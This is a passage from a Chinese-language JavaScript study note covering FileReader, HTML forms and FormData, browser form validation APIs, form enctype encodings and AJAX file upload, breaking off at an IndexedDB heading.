<li>FileReader.readAsDataURL()：读取完成后，<code>result</code>属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于<code>&lt;img&gt;</code>元素的<code>src</code>属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀<code>data:*/*;base64,</code>从字符串里删除以后，再进行解码。</li>
<li>FileReader.readAsText()：读取完成后，<code>result</code>属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。</li>
</ul>
<p>下面是一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="cm">/* HTML 代码如下</span>
<span class="cm">  &lt;input type=&quot;file&quot; onchange=&quot;previewFile()&quot;&gt;</span>
<span class="cm">  &lt;img src=&quot;&quot; height=&quot;200&quot;&gt;</span>
<span class="cm">*/</span>

<span class="kd">function</span> <span class="nx">previewFile</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">preview</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">file</span>    <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;input[type=file]&#39;</span><span class="p">).</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
  <span class="kd">var</span> <span class="nx">reader</span>  <span class="o">=</span> <span class="k">new</span> <span class="nx">FileReader</span><span class="p">();</span>

  <span class="nx">reader</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">preview</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">reader</span><span class="p">.</span><span class="nx">result</span><span class="p">;</span>
  <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">reader</span><span class="p">.</span><span class="nx">readAsDataURL</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给<code>&lt;img&gt;</code>元素的<code>src</code>属性，从而把图片展示出来。</p>
<h3 id="1013-formdata">10.13 表单/FormData<a class="headerlink" href="#1013-formdata" title="Permanent link">&para;</a></h3>
<h4 id="form">表单 form<a class="headerlink" href="#form" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#39;/handling-page&#39;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#39;post&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;myform&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;name&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;name&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;user_name&quot;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;submit_button&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>当点击提交时，内部的表单会以键值对（name=value）的形式提交到服务器；如果是GET的请求方法，就在URL中以查询字符串的形式（?name=Michael&amp;password=test），请求头就是这样的。如果是POST请求，就会将这部分参数转化成Formdata进行传递。</p>
<h4 id="formdata">FormData 对象<a class="headerlink" href="#formdata" title="Permanent link">&para;</a></h4>
<p>可以手动构造Formdara对象并发送请求</p>
<div class="codehilite"><pre><span></span><code><span class="kd">let</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;myForm&#39;</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">(</span><span class="nx">form</span><span class="p">);</span>

<span class="nx">实例方法</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;user_name&#39;</span><span class="p">)</span> <span class="c1">//</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">getAll</span><span class="p">();</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">);</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s1">&#39;key1&#39;</span><span class="p">,</span> <span class="s1">&#39;value1&#39;</span><span class="p">);</span>
<span class="nx">formData</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="s1">&#39;key&#39;</span><span class="p">);</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">keys</span><span class="p">()</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">values</span><span class="p">()</span>
<span class="nx">formData</span><span class="p">.</span><span class="nx">entries</span><span class="p">()</span>
</code></pre></div>

<h4 id="_21">表单的内置验证<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
<h5 id="_22">自动校验<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h5>
<p>表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。</p>
<div class="codehilite"><pre><span></span><code><span class="c">&lt;!-- 必填 --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">required</span><span class="p">&gt;</span>

<span class="c">&lt;!-- 必须符合正则表达式 --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">pattern</span><span class="o">=</span><span class="s">&quot;banana|cherry&quot;</span><span class="p">&gt;</span>

<span class="c">&lt;!-- 字符串长度必须为6个字符 --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">minlength</span><span class="o">=</span><span class="s">&quot;6&quot;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;6&quot;</span><span class="p">&gt;</span>

<span class="c">&lt;!-- 数值必须在1到10之间 --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;number&quot;</span> <span class="na">min</span><span class="o">=</span><span class="s">&quot;1&quot;</span> <span class="na">max</span><span class="o">=</span><span class="s">&quot;10&quot;</span><span class="p">&gt;</span>

<span class="c">&lt;!-- 必须填入 Email 地址 --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="p">&gt;</span>

<span class="c">&lt;!-- 必须填入 URL --&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;URL&quot;</span><span class="p">&gt;</span>
</code></pre></div>

<p>如果一个控件通过验证，它就会匹配<code>:valid</code>的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配<code>:invalid</code>的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。</p>
<h5 id="checkvalidity">checkValidity()<a class="headerlink" href="#checkvalidity" title="Permanent link">&para;</a></h5>
<p>手动触发表单的校验。表单元素和表单控件都有<code>checkValidity()</code>方法，用于手动触发校验。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// 触发整个表单的校验</span>
<span class="nx">form</span><span class="p">.</span><span class="nx">checkValidity</span><span class="p">()</span>

<span class="c1">// 触发单个表单控件的校验</span>
<span class="nx">formControl</span><span class="p">.</span><span class="nx">checkValidity</span><span class="p">()</span>
</code></pre></div>

<p><code>checkValidity()</code>方法返回一个布尔值，<code>true</code>表示通过校验，<code>false</code>表示没有通过校验。因此，提交表单可以封装为下面的函数。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">function</span> <span class="nx">submitForm</span><span class="p">(</span><span class="nx">action</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">);</span>
  <span class="nx">form</span><span class="p">.</span><span class="nx">action</span> <span class="o">=</span> <span class="nx">action</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">form</span><span class="p">.</span><span class="nx">checkValidity</span><span class="p">())</span> <span class="p">{</span>
    <span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<h5 id="willvalidate">willValidate 属性<a class="headerlink" href="#willvalidate" title="Permanent link">&para;</a></h5>
<p>控件元素的<code>willValidate</code>属性是一个布尔值，表示该控件是否会在提交时进行校验。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// HTML 代码如下</span>
<span class="c1">// &lt;form novalidate&gt;</span>
<span class="c1">//   &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;</span>
<span class="c1">// &lt;/form&gt;</span>

<span class="kd">var</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;#name&#39;</span><span class="p">);</span>
<span class="nx">input</span><span class="p">.</span><span class="nx">willValidate</span> <span class="c1">// true</span>
</code></pre></div>

<h5 id="validationmessage">validationMessage 属性<a class="headerlink" href="#validationmessage" title="Permanent link">&para;</a></h5>
<p>控件元素的<code>validationMessage</code>属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。</p>
<ul>
<li>该控件不会在提交时自动校验</li>
<li>该控件满足校验条件</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="c1">// HTML 代码如下</span>
<span class="c1">// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;form input&#39;</span><span class="p">).</span><span class="nx">validationMessage</span>
<span class="c1">// &quot;请填写此字段。&quot;</span>
</code></pre></div>

<p>下面是另一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">myInput</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;myinput&#39;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">myInput</span><span class="p">.</span><span class="nx">checkValidity</span><span class="p">())</span> <span class="p">{</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;prompt&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">myInput</span><span class="p">.</span><span class="nx">validationMessage</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<h5 id="setcustomvalidity">setCustomValidity()<a class="headerlink" href="#setcustomvalidity" title="Permanent link">&para;</a></h5>
<p>控件元素的<code>setCustomValidity()</code>方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。</p>
<p>如果调用这个方法，并且参数不为空字符串，浏览器就会认为控件没有通过校验，就会立刻显示该方法设置的报错信息。</p>
<div class="codehilite"><pre><span></span><code><span class="cm">/* HTML 代码如下</span>
<span class="cm">&lt;form&gt;</span>
<span class="cm">  &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt;</span>
<span class="cm">  &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;</span>
<span class="cm">&lt;/form&gt;</span>
<span class="cm">*/</span>

<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">onchange</span> <span class="o">=</span> <span class="nx">checkFileSize</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">checkFileSize</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">files</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">files</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">files</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">size</span> <span class="o">&gt;</span> <span class="mf">75</span> <span class="o">*</span> <span class="mf">1024</span><span class="p">)</span> <span class="p">{</span>
       <span class="nx">fs</span><span class="p">.</span><span class="nx">setCustomValidity</span><span class="p">(</span><span class="s1">&#39;文件不能大于 75KB&#39;</span><span class="p">);</span>
       <span class="k">return</span><span class="p">;</span>
     <span class="p">}</span>
  <span class="p">}</span>
  <span class="nx">fs</span><span class="p">.</span><span class="nx">setCustomValidity</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。</p>
<h5 id="validity">validity 属性<a class="headerlink" href="#validity" title="Permanent link">&para;</a></h5>
<p>控件元素的属性<code>validity</code>属性返回一个<code>ValidityState</code>对象，包含当前校验状态的信息。</p>
<p>该对象有以下属性，全部为只读属性。</p>
<ul>
<li><code>ValidityState.badInput</code>：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。</li>
<li><code>ValidityState.customError</code>：布尔值，表示是否已经调用<code>setCustomValidity()</code>方法，将校验信息设置为一个非空字符串。</li>
<li><code>ValidityState.patternMismatch</code>：布尔值，表示用户输入的值是否不满足模式的要求。</li>
<li><code>ValidityState.rangeOverflow</code>：布尔值，表示用户输入的值是否大于最大范围。</li>
<li><code>ValidityState.rangeUnderflow</code>：布尔值，表示用户输入的值是否小于最小范围。</li>
<li><code>ValidityState.stepMismatch</code>：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。</li>
<li><code>ValidityState.tooLong</code>：布尔值，表示用户输入的字数超出了最长字数。</li>
<li><code>ValidityState.tooShort</code>：布尔值，表示用户输入的字符少于最短字数。</li>
<li><code>ValidityState.typeMismatch</code>：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。</li>
<li><code>ValidityState.valid</code>：布尔值，表示用户是否满足所有校验条件。</li>
<li><code>ValidityState.valueMissing</code>：布尔值，表示用户没有填入必填的值。</li>
</ul>
<p>下面是一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;myinput&#39;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">validity</span><span class="p">.</span><span class="nx">valid</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;通过校验&#39;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;校验失败&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>下面是另外一个例子。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">txt</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;myInput&#39;</span><span class="p">).</span><span class="nx">validity</span><span class="p">.</span><span class="nx">rangeOverflow</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">txt</span> <span class="o">=</span> <span class="s1">&#39;数值超过上限&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;prompt&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">txt</span><span class="p">;</span>
</code></pre></div>

<h5 id="novalidate">表单的 novalidate 属性<a class="headerlink" href="#novalidate" title="Permanent link">&para;</a></h5>
<p>表单元素的 HTML 属性<code>novalidate</code>，可以关闭浏览器的自动校验。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">novalidate</span><span class="p">&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>这个属性也可以在脚本里设置。</p>
<div class="codehilite"><pre><span></span><code>form.noValidate = true;
</code></pre></div>

<p>如果表单元素没有设置<code>novalidate</code>属性，那么提交按钮（<code>&lt;button&gt;</code>或<code>&lt;input&gt;</code>元素）的<code>formnovalidate</code>属性也有同样的作用。</p>
<div class="codehilite"><pre><span></span><code>&lt;form&gt;
  &lt;input type=&quot;submit&quot; value=&quot;submit&quot; formnovalidate&gt;
&lt;/form&gt;
</code></pre></div>

<h4 id="enctype">enctype 属性<a class="headerlink" href="#enctype" title="Permanent link">&para;</a></h4>
<p>表单能够用四种编码，向服务器发送数据。编码格式由表单的<code>enctype</code>属性决定。</p>
<p>假定表单有两个字段，分别是<code>foo</code>和<code>baz</code>，其中<code>foo</code>字段的值等于<code>bar</code>，<code>baz</code>字段的值是一个分为两行的字符串。</p>
<div class="codehilite"><pre><span></span><code>The first line.
The second line.
</code></pre></div>

<p>下面四种格式，都可以将这个表单发送到服务器。</p>
<p><strong>（1）GET 方法</strong></p>
<p>如果表单使用<code>GET</code>方法发送数据，<code>enctype</code>属性无效。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span>
  <span class="na">action</span><span class="o">=</span><span class="s">&quot;register.php&quot;</span>
  <span class="na">method</span><span class="o">=</span><span class="s">&quot;get&quot;</span>
  <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;AJAXSubmit(this); return false;&quot;</span>
<span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>数据将以 URL 的查询字符串发出。</p>
<div class="codehilite"><pre><span></span><code>?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.
</code></pre></div>

<p><strong>（2）application/x-www-form-urlencoded</strong></p>
<p>如果表单用<code>POST</code>方法发送数据，并省略<code>enctype</code>属性，那么数据以<code>application/x-www-form-urlencoded</code>格式发送（因为这是默认值）。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span>
  <span class="na">action</span><span class="o">=</span><span class="s">&quot;register.php&quot;</span>
  <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span>
  <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;AJAXSubmit(this); return false;&quot;</span>
<span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>发送的 HTTP 请求如下。</p>
<div class="codehilite"><pre><span></span><code>Content-Type: application/x-www-form-urlencoded
foo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A
</code></pre></div>

<p>上面代码中，数据体里面的<code>%0D%0A</code>代表换行符（<code>\r\n</code>）。</p>
<p><strong>（3）text/plain</strong></p>
<p>如果表单使用<code>POST</code>方法发送数据，<code>enctype</code>属性为<code>text/plain</code>，那么数据将以纯文本格式发送。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span>
  <span class="na">action</span><span class="o">=</span><span class="s">&quot;register.php&quot;</span>
  <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span>
  <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span>
  <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;AJAXSubmit(this); return false;&quot;</span>
<span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>发送的 HTTP 请求如下。</p>
<div class="codehilite"><pre><span></span><code>Content-Type: text/plain

foo=bar
baz=The first line.
The second line.
</code></pre></div>

<p><strong>（4）multipart/form-data</strong></p>
<p>如果表单使用<code>POST</code>方法，<code>enctype</code>属性为<code>multipart/form-data</code>，那么数据将以混合的格式发送。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span>
  <span class="na">action</span><span class="o">=</span><span class="s">&quot;register.php&quot;</span>
  <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span>
  <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span>
  <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;AJAXSubmit(this); return false;&quot;</span>
<span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>发送的 HTTP 请求如下。</p>
<div class="codehilite"><pre><span></span><code>Content-Type: multipart/form-data; boundary=

Content-Disposition: form-data; name=&quot;foo&quot;

bar

Content-Disposition: form-data; name=&quot;baz&quot;

The first line.
The second line.
</code></pre></div>

<p>这种格式也是文件上传的格式。</p>
<h4 id="_23">文件上传<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h4>
<p>用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;myFile&quot;</span><span class="p">&gt;</span>
</code></pre></div>

<p>此外，还需要将表单<code>&lt;form&gt;</code>元素的<code>method</code>属性设为<code>POST</code>，<code>enctype</code>属性设为<code>multipart/form-data</code>。其中，<code>enctype</code>属性决定了 HTTP 头信息的<code>Content-Type</code>字段的值，默认情况下这个字段的值是<code>application/x-www-form-urlencoded</code>，但是文件上传的时候要改成<code>multipart/form-data</code>。</p>
<div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;file&quot;</span><span class="p">&gt;</span>选择一个文件<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;myFile&quot;</span> <span class="na">multiple</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;submit_button&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;上传&quot;</span> <span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>

<p>上面的 HTML 代码中，file 控件的<code>multiple</code>属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">files</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">).</span><span class="nx">files</span><span class="p">;</span>
</code></pre></div>

<p>然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>

<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">files</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">files</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>

  <span class="c1">// 只上传图片文件</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file</span><span class="p">.</span><span class="nx">type</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="s1">&#39;image.*&#39;</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">continue</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="nx">formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s1">&#39;photos[]&#39;</span><span class="p">,</span> <span class="nx">file</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>最后，使用 Ajax 向服务器上传文件。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;handler.php&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">!==</span> <span class="mf">200</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;An error occurred!&#39;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">};</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
</code></pre></div>

<p>除了发送 FormData 实例，也可以直接 AJAX 发送文件。</p>
<div class="codehilite"><pre><span></span><code><span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;test-input&#39;</span><span class="p">).</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>

<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;myserver/uploads&#39;</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span> <span class="nx">file</span><span class="p">.</span><span class="nx">type</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
</code></pre></div>

<h3 id="1014-indexeddb-api">10.14 IndexedDB API<a class="headerlink" href="#1014-indexeddb-api" title="Permanent link">&para;</a></h3>
<p>注意：IndexedDB实际工作中没用过，面试题中没遇到过，这里简单过一次。</p>
<h4 id="1indexeddb">1、IndexedDB<a class="headerlink" href="#1indexeddb" title="Permanent link">&para;</a></h4>
